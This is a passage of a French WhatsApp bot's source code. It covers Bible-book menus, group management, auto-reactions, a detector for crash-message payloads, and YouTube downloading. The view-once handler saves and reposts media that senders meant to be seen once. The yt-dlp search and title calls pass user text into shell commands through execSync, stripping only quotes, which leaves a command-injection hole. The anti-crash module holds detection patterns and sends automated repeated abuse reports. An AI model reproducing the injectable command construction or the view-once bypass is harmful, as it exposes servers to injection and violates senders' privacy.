    'ephesiens': { nom: 'Éphésiens', chapitres: 6, testament: 'Nouveau' },
    'philippiens': { nom: 'Philippiens', chapitres: 4, testament: 'Nouveau' },
    'colossiens': { nom: 'Colossiens', chapitres: 4, testament: 'Nouveau' },
    '1thessaloniciens': { nom: '1 Thessaloniciens', chapitres: 5, testament: 'Nouveau' },
    '2thessaloniciens': { nom: '2 Thessaloniciens', chapitres: 3, testament: 'Nouveau' },
    '1timothee': { nom: '1 Timothée', chapitres: 6, testament: 'Nouveau' },
    '2timothee': { nom: '2 Timothée', chapitres: 4, testament: 'Nouveau' },
    'tite': { nom: 'Tite', chapitres: 3, testament: 'Nouveau' },
    'philemon': { nom: 'Philémon', chapitres: 1, testament: 'Nouveau' },
    'hebreux': { nom: 'Hébreux', chapitres: 13, testament: 'Nouveau' },
    'jacques': { nom: 'Jacques', chapitres: 5, testament: 'Nouveau' },
    '1pierre': { nom: '1 Pierre', chapitres: 5, testament: 'Nouveau' },
    '2pierre': { nom: '2 Pierre', chapitres: 3, testament: 'Nouveau' },
    '1jean': { nom: '1 Jean', chapitres: 5, testament: 'Nouveau' },
    '2jean': { nom: '2 Jean', chapitres: 1, testament: 'Nouveau' },
    '3jean': { nom: '3 Jean', chapitres: 1, testament: 'Nouveau' },
    'jude': { nom: 'Jude', chapitres: 1, testament: 'Nouveau' },
    'apocalypse': { nom: 'Apocalypse', chapitres: 22, testament: 'Nouveau' }
  };

  const touteLaBible = { ...ancienTestament, ...nouveauTestament };

  // Si aucun argument, afficher le menu
  if (!args[0]) {
    const menuText = `╔═══════════════════════════════════╗
║       📖 𝗟𝗔 𝗦𝗔𝗜𝗡𝗧𝗘 𝗕𝗜𝗕𝗟𝗘       ║
╚═══════════════════════════════════╝

📚 *Utilisation:*
!bible ancien - Ancien Testament (39 livres)
!bible nouveau - Nouveau Testament (27 livres)
!bible liste - Liste complète (66 livres)
!bible [livre] - Info sur un livre

📝 *Exemples:*
!bible genese
!bible matthieu
!bible psaumes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
"La parole de Dieu est vivante"`;

    await sendWithImage(sock, remoteJid, 'bible', menuText);
    return;
  }

  const commande = args[0].toLowerCase();

  // Liste de l'Ancien Testament
  if (commande === 'ancien') {
    let texte = `╔═══════════════════════════════════╗
║   📜 𝗔𝗡𝗖𝗜𝗘𝗡 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧    ║
╚═══════════════════════════════════╝

📚 *39 livres de l'Ancien Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PENTATEUQUE (5):*
1. Genèse (50 ch.)
2. Exode (40 ch.)
3. Lévitique (27 ch.)
4. Nombres (36 ch.)
5. Deutéronome (34 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES HISTORIQUES (12):*
6. Josué (24 ch.)
7. Juges (21 ch.)
8. Ruth (4 ch.)
9. 1 Samuel (31 ch.)
10. 2 Samuel (24 ch.)
11. 1 Rois (22 ch.)
12. 2 Rois (25 ch.)
13. 1 Chroniques (29 ch.)
14. 2 Chroniques (36 ch.)
15. Esdras (10 ch.)
16. Néhémie (13 ch.)
17. Esther (10 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *LIVRES POÉTIQUES (5):*
18. Job (42 ch.)
19. Psaumes (150 ch.)
20. Proverbes (31 ch.)
21. Ecclésiaste (12 ch.)
22. Cantique des Cantiques (8 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *GRANDS PROPHÈTES (5):*
23. Ésaïe (66 ch.)
24. Jérémie (52 ch.)
25. Lamentations (5 ch.)
26. Ézéchiel (48 ch.)
27. Daniel (12 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 *PETITS PROPHÈTES (12):*
28. Osée (14 ch.)
29. Joël (3 ch.)
30. Amos (9 ch.)
31. Abdias (1 ch.)
32. Jonas (4 ch.)
33. Michée (7 ch.)
34. Nahum (3 ch.)
35. Habacuc (3 ch.)
36. Sophonie (3 ch.)
37. Aggée (2 ch.)
38. Zacharie (14 ch.)
39. Malachie (4 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste du Nouveau Testament
  if (commande === 'nouveau') {
    let texte = `╔═══════════════════════════════════╗
║   ✝️ 𝗡𝗢𝗨𝗩𝗘𝗔𝗨 𝗧𝗘𝗦𝗧𝗔𝗠𝗘𝗡𝗧  ║
╚═══════════════════════════════════╝

📚 *27 livres du Nouveau Testament:*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉVANGILES (4):*
1. Matthieu (28 ch.)
2. Marc (16 ch.)
3. Luc (24 ch.)
4. Jean (21 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *HISTOIRE (1):*
5. Actes des Apôtres (28 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES DE PAUL (13):*
6. Romains (16 ch.)
7. 1 Corinthiens (16 ch.)
8. 2 Corinthiens (13 ch.)
9. Galates (6 ch.)
10. Éphésiens (6 ch.)
11. Philippiens (4 ch.)
12. Colossiens (4 ch.)
13. 1 Thessaloniciens (5 ch.)
14. 2 Thessaloniciens (3 ch.)
15. 1 Timothée (6 ch.)
16. 2 Timothée (4 ch.)
17. Tite (3 ch.)
18. Philémon (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *ÉPÎTRES GÉNÉRALES (8):*
19. Hébreux (13 ch.)
20. Jacques (5 ch.)
21. 1 Pierre (5 ch.)
22. 2 Pierre (3 ch.)
23. 1 Jean (5 ch.)
24. 2 Jean (1 ch.)
25. 3 Jean (1 ch.)
26. Jude (1 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✝️ *APOCALYPSE (1):*
27. Apocalypse (22 ch.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Liste complète
  if (commande === 'liste') {
    let texte = `╔═══════════════════════════════════╗
║     📖 𝗟𝗔 𝗕𝗜𝗕𝗟𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘    ║
╚═══════════════════════════════════╝

📊 *Composition de la Bible:*

📜 Ancien Testament: 39 livres
✝️ Nouveau Testament: 27 livres
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📚 *TOTAL: 66 livres*

💡 *Pour voir la liste détaillée:*
• !bible ancien - Voir les 39 livres
• !bible nouveau - Voir les 27 livres

📖 *Pour info sur un livre:*
• !bible [nom du livre]
• : !bible genese

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✨ *Quelques statistiques:*
• Plus long livre: Psaumes (150 ch.)
• Plus court: 2 Jean, 3 Jean, Jude (1 ch.)
• Premier livre: Genèse
• Dernier livre: Apocalypse

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
"Toute Écriture est inspirée de Dieu"`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
    return;
  }

  // Recherche d'un livre spécifique
  const livreRecherche = commande.toLowerCase().replace(/\s/g, '');
  const livre = touteLaBible[livreRecherche];

  if (livre) {
    const testament = livre.testament === 'Ancien' ? '📜 Ancien Testament' : '✝️ Nouveau Testament';
    const texte = `╔═══════════════════════════════════╗
║        📖 ${livre.nom.toUpperCase()}        ║
╚═══════════════════════════════════╝

${testament}

📊 *Informations:*
• Nombre de chapitres: ${livre.chapitres}
• Testament: ${livre.testament}

💡 *Pour lire ce livre:*
Utilisez votre Bible ou une application
de lecture biblique.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`;

    await sendWithImage(sock, remoteJid, 'bible', texte);
  } else {
    await sock.sendMessage(remoteJid, {
      text: `❌ Livre "${args[0]}" non trouvé.\n\nUtilisez !bible liste pour voir tous les livres disponibles.`
    });
  }
}

async function handleLeave(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '\u26D4 Admins du bot uniquement.' });
    return;
  }

  await sock.sendMessage(remoteJid, { 
    text: `\u250C\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2510
Sayonara everyone
\u2514\u2500\u2500\u2500 \u22C6\u22C5\u2606\u22C5\u22C6 \u2500\u2500\u2500\u2518
\uD83D\uDCA0 _Bot leave. See you soon!_`
  });
  await delay(2000);
  await sock.groupLeave(remoteJid);
}

async function handleAutoReactCommand(sock, args, remoteJid, senderJid, _saveStateFn, _autoReactCurrent) {
  // Compatibilité : si appelé sans _saveStateFn (ancien code), fallback global
  const _setAR = _saveStateFn || ((k, v) => { autoReact = v; });
  const _arNow = typeof _autoReactCurrent !== 'undefined' ? _autoReactCurrent : autoReact;
  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
    return;
  }

  if (args.length === 0) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *Auto-React*\n\nStatut: ${_arNow ? '✅ ON' : '❌ OFF'}\n\n${config.prefix}autoreact on/off\n${config.prefix}autoreact list\n${config.prefix}autoreact add <mot> <emoji>\n${config.prefix}autoreact remove <mot>`
    });
    return;
  }

  const subCommand = args[0].toLowerCase();

  switch (subCommand) {
    case 'on':
      _setAR('autoReact', true);
      saveData();
      await sock.sendMessage(remoteJid, { text: '✅ Auto-React ACTIVÉ' });
      break;

    case 'off':
      _setAR('autoReact', false);
      saveData();
      await sock.sendMessage(remoteJid, { text: '❌ Auto-React DÉSACTIVÉ' });
      break;

    case 'list':
      const wordList = Object.entries(autoreactWords)
        .map(([word, emoji]) => `• ${word} → ${emoji}`)
        .join('\n');
      await sock.sendMessage(remoteJid, {
        text: `📝 *Mots*:\n\n${wordList || 'Aucun'}`
      });
      break;

    case 'add':
      if (args.length < 3) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact add <mot> <emoji>`
        });
        return;
      }
      const wordToAdd = args[1].toLowerCase();
      const emojiToAdd = args.slice(2).join(' ');
      autoreactWords[wordToAdd] = emojiToAdd;
      saveData();
      await sock.sendMessage(remoteJid, {
        text: `✅  : "${wordToAdd}" → ${emojiToAdd}`
      });
      break;

    case 'remove':
      if (args.length < 2) {
        await sock.sendMessage(remoteJid, {
          text: `❌ Format: ${config.prefix}autoreact remove <mot>`
        });
        return;
      }
      const wordToRemove = args[1].toLowerCase();
      if (autoreactWords[wordToRemove]) {
        delete autoreactWords[wordToRemove];
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `✅  : "${wordToRemove}"`
        });
      } else {
        await sock.sendMessage(remoteJid, {
          text: `❌ Mot non trouvé`
        });
      }
      break;

    default:
      await sock.sendMessage(remoteJid, {
        text: `❌ Sous-commande inconnue`
      });
  }
}

async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid) {
  // ── Seul comportement : reply .vv sur un message vu-unique → ouvre dans le chat ──
  // Chercher le message quoté (reply)
  const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedId = message.message?.extendedTextMessage?.contextInfo?.stanzaId;

  if (!quoted && !quotedId) {
    await sock.sendMessage(remoteJid, {
      text: `👁️ *VU UNIQUE*\n\n💡 Réponds à un message *vu unique* avec \`${config.prefix}vv\` pour l'ouvrir dans le chat.\n\n_Ou réponds avec n'importe quel emoji pour recevoir le média en PV._\n\n*© SEIGNEUR TD*`
    }, { quoted: message });
    return;
  }

  try {
    let mediaData = null, mediaType = '', mimetype = '', isGif = false, isPtt = false;

    // 1. Essayer depuis le message quoté directement
    const qVO = quoted?.viewOnceMessageV2 || quoted?.viewOnceMessageV2Extension;
    const qImg = qVO?.message?.imageMessage || quoted?.imageMessage;
    const qVid = qVO?.message?.videoMessage || quoted?.videoMessage;
    const qAud = qVO?.message?.audioMessage || quoted?.audioMessage || qVO?.message?.pttMessage || quoted?.pttMessage;

    if (qImg) {
      mediaType = 'image'; mimetype = qImg.mimetype || 'image/jpeg';
      mediaData = await toBuffer(await downloadContentFromMessage(qImg, 'image'));
    } else if (qVid) {
      mediaType = 'video'; mimetype = qVid.mimetype || 'video/mp4';
      isGif = qVid.gifPlayback || false;
      mediaData = await toBuffer(await downloadContentFromMessage(qVid, 'video'));
    } else if (qAud) {
      mediaType = 'audio'; mimetype = qAud.mimetype || 'audio/ogg; codecs=opus';
      isPtt = qAud.ptt !== false;
      mediaData = await toBuffer(await downloadContentFromMessage(qAud, 'audio'));
    }

    // 2. Si pas trouvé dans quoted, chercher dans le cache temporaire par messageId
    if ((!mediaData || mediaData.length < 100) && quotedId) {
      global._vvTempCache = global._vvTempCache || new Map();
      const cached = global._vvTempCache.get(quotedId);
      if (cached) {
        mediaData = cached.buffer; mediaType = cached.type;
        mimetype = cached.mimetype; isGif = cached.isGif; isPtt = cached.ptt;
      }
    }

    if (!mediaData || mediaData.length < 100) {
      await sock.sendMessage(remoteJid, {
        text: `❌ Média introuvable. Le vu-unique a peut-être expiré.\n\n*© SEIGNEUR TD*`
      }, { quoted: message });
      return;
    }

    // Envoyer dans le chat (toPv = false)
    await sendVVMedia(sock, remoteJid, {
      type: mediaType, buffer: mediaData, mimetype, isGif, ptt: isPtt,
      timestamp: Date.now(), sender: senderJid, size: mediaData.length, fromJid: senderJid
    }, 1, 1, false);

  } catch(e) {
    console.error('[VV command]', e.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ Erreur lors de l'extraction du média.\n\n*© SEIGNEUR TD*`
    }, { quoted: message });
  }
}

// Envoyer un média VV with infos
async function sendVVMedia(sock, remoteJid, item, num, total, toPv = false) {
  try {
    const date = new Date(item.timestamp).toLocaleString('ar-SA', {
      timeZone: 'America/Port-au-Prince',
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    const from = item.fromJid.split('@')[0];
    const caption = '';
    // Si toPv=true, envoyer en PV du bot
    const _dest = toPv ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : remoteJid;

    if (item.type === 'image') {
      await sock.sendMessage(_dest, {
        image: item.buffer,
        caption
      });
    } else if (item.type === 'video') {
      await sock.sendMessage(_dest, {
        video: item.buffer,
        caption,
        gifPlayback: item.isGif || false
      });
    } else if (item.type === 'audio') {
      await sock.sendMessage(_dest, {
        audio: item.buffer,
        ptt: false,
        mimetype: 'audio/ogg; codecs=opus',
        audioPlayback: true
      });
    }
  } catch (e) {
    console.error('[sendVVMedia]', e.message);
    // Silencieux — ne pas envoyer de message d'erreur dans le chat
  }
}

// =============================================
// =============================================

// Signatures de payloads malveillants connus
const BUG_SIGNATURES = {
  // Caractères arabes crashants (U+0600–U+0605, U+202E RTL, etc.)
  arabicCrash: /[\u0600-\u0605\u200E\u200F\u202A-\u202E\u2066-\u2069]{10,}/,
  // Flood d'emojis (>200 emojis consécutifs)
  emojiFlood: /(\p{Emoji_Presentation}|\p{Extended_Pictographic}){50,}/u,
  // Caractères invisibles en masse (zero-width)
  invisibleChars: /[\u200B-\u200D\uFEFF\u180E\u034F]{20,}/,
  // Zalgo / caractères combinants excessifs
  zalgo: /[\u0300-\u036F\u0489\u1DC0-\u1DFF]{15,}/,
  // Chaînes extrêmement longues (>5000 chars d'un seul message)
  massiveText: null, // géré par longueur
  // Caractères CJK en masse (chinois crashant)
  cjkFlood: /[\u4E00-\u9FFF\u3400-\u4DBF]{200,}/,
  // RTL override massif
  rtlOverride: /\u202E{3,}/,
  // Null bytes / caractères de contrôle
  controlChars: /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{5,}/,
};

// Détection dans le contenu du message (texte + métadonnées)
function detectBugPayload(message, messageText) {
  try {
    // 1. Analyser le texte principal
    const text = messageText || '';

    // Longueur excessive
    if (text.length > 5000) {
      return { type: 'MASSIVE_TEXT', detail: `${text.length} caractères`, severity: 'HIGH' };
    }

    // Vérifier chaque signature
    for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
      if (regex && regex.test(text)) {
        return { type: name.toUpperCase(), detail: 'Payload malveillant détecté', severity: 'HIGH' };
      }
    }

    // 2. Analyser les métadonnées du message (contextInfo malveillant)
    const ctx = message.message?.extendedTextMessage?.contextInfo;
    if (ctx) {
      // Thumbnail URL corrompue
      const extAd = ctx.externalAdReply;
      if (extAd) {
        const title = extAd.title || '';
        const body = extAd.body || '';
        if (title.length > 2000 || body.length > 2000) {
          return { type: 'MALICIOUS_CONTEXT', detail: 'externalAdReply corrompu', severity: 'HIGH' };
        }
        // Vérifier les payloads dans le titre/body
        for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
          if (regex && (regex.test(title) || regex.test(body))) {
            return { type: `CONTEXT_${name.toUpperCase()}`, detail: 'Payload dans contextInfo', severity: 'HIGH' };
          }
        }
      }
    }

    // 3. Détecter les messages viewOnce with contenu malveillant
    const vv = message.message?.viewOnceMessageV2 || message.message?.viewOnceMessageV2Extension;
    if (vv) {
      const innerCtx = vv.message?.extendedTextMessage?.contextInfo?.externalAdReply;
      if (innerCtx?.title?.length > 1000) {
        return { type: 'VIEWONCE_EXPLOIT', detail: 'ViewOnce with payload', severity: 'CRITICAL' };
      }
    }

    // 4. Détecter les stickers malveillants (payload dans webpUrl)
    const sticker = message.message?.stickerMessage;
    if (sticker?.url && sticker.url.length > 500) {
      return { type: 'STICKER_EXPLOIT', detail: 'Sticker with URL suspecte', severity: 'MEDIUM' };
    }

    // 5. Flood de mentions (>20 mentions = attaque)
    const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentions.length > 20) {
      return { type: 'MENTION_FLOOD', detail: `${mentions.length} mentions`, severity: 'HIGH' };
    }

  } catch (e) {
    console.error(' detectBugPayload:', e);
    return null;
  }
}

async function handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugInfo) {
  const senderNum = senderJid.split('@')[0];
  const now = Date.now();


  // 1. Supprimer immédiatement le message malveillant
  try {
    await sock.sendMessage(remoteJid, { delete: message.key });
  } catch (e) { /* peut échouer si pas admin groupe */ }

  // 2. Mettre à jour le tracker
  const existing = antiBugTracker.get(senderJid) || { count: 0, firstSeen: now, lastSeen: now, blocked: false, attacks: [] };
  existing.count++;
  existing.lastSeen = now;
  existing.attacks.push({ type: bugInfo.type, detail: bugInfo.detail, severity: bugInfo.severity, timestamp: now });
  antiBugTracker.set(senderJid, existing);

  // 3. Si déjà bloqué, ignorer silencieusement
  if (existing.blocked) {
    return;
  }

  // 4. Alerte dans le chat
  const severityEmoji = bugInfo.severity === 'CRITICAL' ? '☠️' : bugInfo.severity === 'HIGH' ? '🔴' : '🟡';

  await sock.sendMessage(remoteJid, {
    text: `⚠️ *ATTENTION !*

🚨 UN LONG TEXTE SUSPECT A ÉTÉ DÉTECTÉ !

📱 Envoyé par : @${senderNum}

*© SEIGNEUR TD*`,
    mentions: [senderJid]
  });

  // 5. Si 5 attaques ou CRITICAL → action immédiate
  if (existing.count >= 5 || bugInfo.severity === 'CRITICAL') {
    existing.blocked = true;
    antiBugTracker.set(senderJid, existing);

    // a. Signaler 5 fois à WhatsApp
    await reportToWhatsApp(sock, senderJid, senderNum, existing.attacks);

    // b. Bloquer le contact
    try {
      await sock.updateBlockStatus(senderJid, 'block');
    } catch (e) {
      console.error(' blocage:', e);
    }

    // c. Si groupe → expulser
    if (isGroup) {
      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
        }
      } catch (e) { /* silencieux */ }
    }

    // d. Message de confirmation
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅     ✅  ━━━┓

☠️ *   :*

📱 : +${senderNum}
🔒 :  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅     (5 )
✅   
${isGroup ? '✅    ' : ''}
✅     

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 * :*
${existing.attacks.slice(-3).map((a, i) => `${i + 1}. ${a.type} - ${a.severity}`).join('\n')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*    -  *`,
      mentions: [senderJid]
    });

    // e. Notifier l'admin du bot en privé
    for (const adminJid of config.adminNumbers) {
      try {
        await sock.sendMessage(adminJid, {
          text: `🚨 *  *\n\n☠️  ${bugInfo.severity}  !\n\n📱 : +${senderNum}\n📍 : ${isGroup ? '' : ' '}\n🔍 : ${bugInfo.type}\n🔢 : ${existing.count}\n\n✅ :  +   + ${isGroup ? ' + ' : ''}`
        });
      } catch (e) { /* silencieux */ }
    }
  }
}

// Envoyer des signalements à WhatsApp (5 fois)
async function reportToWhatsApp(sock, senderJid, senderNum, attacks) {

  const reportReasons = [
    'spam',          // Spam
    'inappropriate', // Contenu inapproprié
    'harassment',    // Harcèlement
    'threat',        // Menace
    'other'          // Autre
  ];

  for (let i = 0; i < 5; i++) {
    try {
      // Signalement via l'API Baileys
      await sock.reportJid(senderJid, 'spam');
      await delay(800); // Délai entre chaque signalement
    } catch (e) {
      // Si reportJid n'existe pas, utiliser sendMessage vers le support WhatsApp
      try {
        await sock.sendMessage('0@s.whatsapp.net', {
        });
      } catch (e2) {
      }
      await delay(500);
    }
  }

}

// Commande !antibug (toggle + status + liste)
async function handleAntiBugCommand(sock, args, remoteJid, senderJid) {
  const sub = args[0]?.toLowerCase();

  // !antibug list → liste des attaquants détectés
  if (sub === 'list') {
    if (antiBugTracker.size === 0) {
      await sock.sendMessage(remoteJid, {
        text: `🛡️ *  *\n\n✅    `
      });
      return;
    }

    let listText = `┏━━━  🛡️    🛡️  ━━━┓\n\n`;
    let i = 1;
    for (const [jid, data] of antiBugTracker.entries()) {
      const num = jid.split('@')[0];
      const date = new Date(data.lastSeen).toLocaleString('ar-SA', { timeZone: 'America/Port-au-Prince' });
      const status = data.blocked ? '🔒 ' : `⚠️ ${data.count} `;
      listText += `${i}. +${num}\n   ${status} | ${data.attacks[0]?.type || '?'}\n   📅 ${date}\n\n`;
      i++;
    }
    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
    listText += `📊 : ${antiBugTracker.size} ()`;

    await sock.sendMessage(remoteJid, { text: listText });
    return;
  }

  // !antibug clear → vider le tracker
  if (sub === 'clear') {
    const count = antiBugTracker.size;
    antiBugTracker.clear();
    await sock.sendMessage(remoteJid, {
      text: `🗑️     (${count} )`
    });
    return;
  }

  // !antibug unblock <number> → débloquer manuellement
  if (sub === 'unblock' && args[1]) {
    const num = args[1].replace(/[^0-9]/g, '');
    const jid = num + '@s.whatsapp.net';
    try {
      await sock.updateBlockStatus(jid, 'unblock');
      antiBugTracker.delete(jid);
      await sock.sendMessage(remoteJid, {
        text: `✅     +${num}`
      });
    } catch (e) {
      await sock.sendMessage(remoteJid, {
        text: `❌    : ${e.message}`
      });
    }
    return;
  }

  // !antibug (sans argument) → toggle ON/OFF
  antiBug = !antiBug;
  saveStoreKey('config');

  const statusEmoji = antiBug ? '✅' : '❌';
  const statusText  = antiBug ? '' : '';

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🛡️    🛡️  ━━━┓

${statusEmoji} *: ${statusText}*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 *  :*

☠️    (Crash)
🐛    (>50)
👻    (>20)
🌀  Zalgo ()
📏   (>5000 )
🀄    (>200)
↪️ RTL Override 
📌 Mentions  (>20)
🖼️ ContextInfo 
👁️ ViewOnce  Payload
🎯 Sticker URL 

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *  :*

1️⃣   
2️⃣   
3️⃣  5 :
   • 📨 5  
   • 🔒  
   • 🚫   
   • 📲  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 * :*

• !antibug list     →  
• !antibug clear    →  
• !antibug unblock [] →  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️  : ${antiBugTracker.size}
🔒 : ${[...antiBugTracker.values()].filter(v => v.blocked).length}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`
  });
}

// =============================================
// 📥 FONCTIONS DE DOWNLOAD
// =============================================
// Dépendances requises (à installer sur votre serveur):
//   npm install @distube/ytdl-core play-dl node-fetch
// =============================================

// Importer dynamiquement pour éviter crash si non installé
async function getYtdl() {
  try { return (await import('@distube/ytdl-core')).default; }
  catch { return null; }
}
async function getPlayDl() {
  try { return await import('play-dl'); }
  catch { return null; }
}
async function getFetch() {
  try { return (await import('node-fetch')).default; }
  catch {
    try { return (await import('axios')).default; }
    catch { return null; }
  }
}

// ─── Extraire videoId depuis URL YouTube ─────────────────────────────────────
function extractYouTubeId(url) {
  const m = url.match(/(?:youtu\.be\/|v=|embed\/)([\w-]{11})/);
  return m ? m[1] : null;
}

// ─── Recherche YouTube via yt-dlp ─────────────────────────────────────────────
async function searchYouTubeId(query) {
  // Si c'est déjà un lien YouTube, extraire l'ID directement
  if (query.includes('youtu.be') || query.includes('youtube.com')) {
    const id = extractYouTubeId(query);
    if (id) return id;
  }
  // Recherche via yt-dlp
  try {
    const { execSync } = await import('child_process');
    const result = execSync(
      'yt-dlp "ytsearch1:' + query.replace(/"/g, '') + '" --print id --no-playlist --quiet',
      { timeout: 15000, encoding: 'utf8' }
    ).trim();
    if (result && result.length === 11) return result;
  } catch(e) { console.log('[YT SEARCH yt-dlp]', e.message); }
  // Fallback scraping YouTube
  try {
    const r = await axios.get('https://www.youtube.com/results?search_query=' + encodeURIComponent(query), {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }, timeout: 10000
    });
    const m = r.data.match(/"videoId":"([\w-]{11})"/);
    if (m) return m[1];
  } catch(e) {}
  return null;
}

// ─── Téléchargement audio via yt-dlp ─────────────────────────────────────────
async function downloadYouTubeAudioBuffer(videoUrl) {
  const { execSync, spawnSync } = await import('child_process');
  const os = await import('os');
  const pathLib = await import('path');
  const tmpFile = pathLib.join(os.tmpdir(), 'ytaudio_' + Date.now());

  // ✅ Méthode 1 : yt-dlp (le plus fiable, installé sur le serveur)
  try {
    spawnSync('yt-dlp', [
      videoUrl,
      '-x', '--audio-format', 'mp3',
      '--audio-quality', '128K',
      '-o', tmpFile + '.%(ext)s',
      '--no-playlist',
      '--quiet',
      '--no-warnings',
      '--socket-timeout', '30'
    ], { timeout: 120000 });
    const outFile = tmpFile + '.mp3';
    if (fs.existsSync(outFile)) {
      const buf = fs.readFileSync(outFile);
      fs.unlinkSync(outFile);
      if (buf.length > 10000) {
        // Récupérer le titre
        let title = '';
        try {
          title = execSync('yt-dlp "' + videoUrl + '" --print title --no-playlist --quiet', { timeout: 10000, encoding: 'utf8' }).trim();
        } catch(e) {}
        return { buf, title };
      }
    }
  } catch(e) { console.log('[YT-DLP AUDIO]', e.message); }

  // ✅ Méthode 2 : APIs externes en fallback
  const apis = [
    async () => {
      const { data } = await axios.get('https://api.giftedtech.co.ke/api/download/savetubemp3?apikey=gifted&url=' + encodeURIComponent(videoUrl), { timeout: 30000 });
      if (!data?.success || !data?.result?.download_url) throw new Error('indisponible');
      const dl = await axios.get(data.result.download_url, { responseType: 'arraybuffer', timeout: 120000 });
      return { buf: Buffer.from(dl.data), title: data?.result?.title };
    },
    async () => {
      const { data } = await axios.post('https://api.cobalt.tools/api/json',
        { url: videoUrl, isAudioOnly: true, aFormat: 'mp3' },
        { headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, timeout: 20000 }
      );
      if (!data?.url) throw new Error('no url');
      const dl = await axios.get(data.url, { responseType: 'arraybuffer', timeout: 120000 });
      return { buf: Buffer.from(dl.data), title: null };
    }
  ];
  for (const api of apis) {
    try {
      const result = await api();
      if (result?.buf?.length > 10000) return result;
    } catch(e) { console.log('[YT AUDIO API]', e.message); }
  }
  throw new Error('Téléchargement impossible. Installe yt-dlp sur le serveur: pip install yt-dlp');
}

// ─── Téléchargement vidéo via yt-dlp ─────────────────────────────────────────
async function downloadYouTubeVideoBuffer(videoUrl) {
  const { spawnSync, execSync } = await import('child_process');
  const os = await import('os');
  const pathLib = await import('path');
  const tmpFile = pathLib.join(os.tmpdir(), 'ytvideo_' + Date.now());

  // ✅ yt-dlp
  try {
    spawnSync('yt-dlp', [
      videoUrl,
      '-f', 'bestvideo[ext=mp4][height<=720]+bestaudio[ext=m4a]/best[ext=mp4][height<=720]/best[height<=720]',
      '--merge-output-format', 'mp4',
      '-o', tmpFile + '.%(ext)s',
      '--no-playlist',
      '--quiet',
      '--no-warnings',
      '--socket-timeout', '30'
    ], { timeout: 180000 });
    const outFile = tmpFile + '.mp4';
    if (fs.existsSync(outFile)) {
      const buf = fs.readFileSync(outFile);
      fs.unlinkSync(outFile);
      if (buf.length > 10000) {
        let title = '';
        try { title = execSync('yt-dlp "' + videoUrl + '" --print title --no-playlist --quiet', { timeout: 10000, encoding: 'utf8' }).trim(); } catch(e) {}
        return { buf, title };
      }
    }
  } catch(e) { console.log('[YT-DLP VIDEO]', e.message); }

  // Fallback APIs
  try {
    const { data } = await axios.post('https://api.cobalt.tools/api/json',
      { url: videoUrl, vCodec: 'h264', vQuality: '720', isAudioOnly: false },
      { headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, timeout: 20000 }
    );
    const dlUrl = data?.url || data?.picker?.[0]?.url;
    if (dlUrl) {
      const dl = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
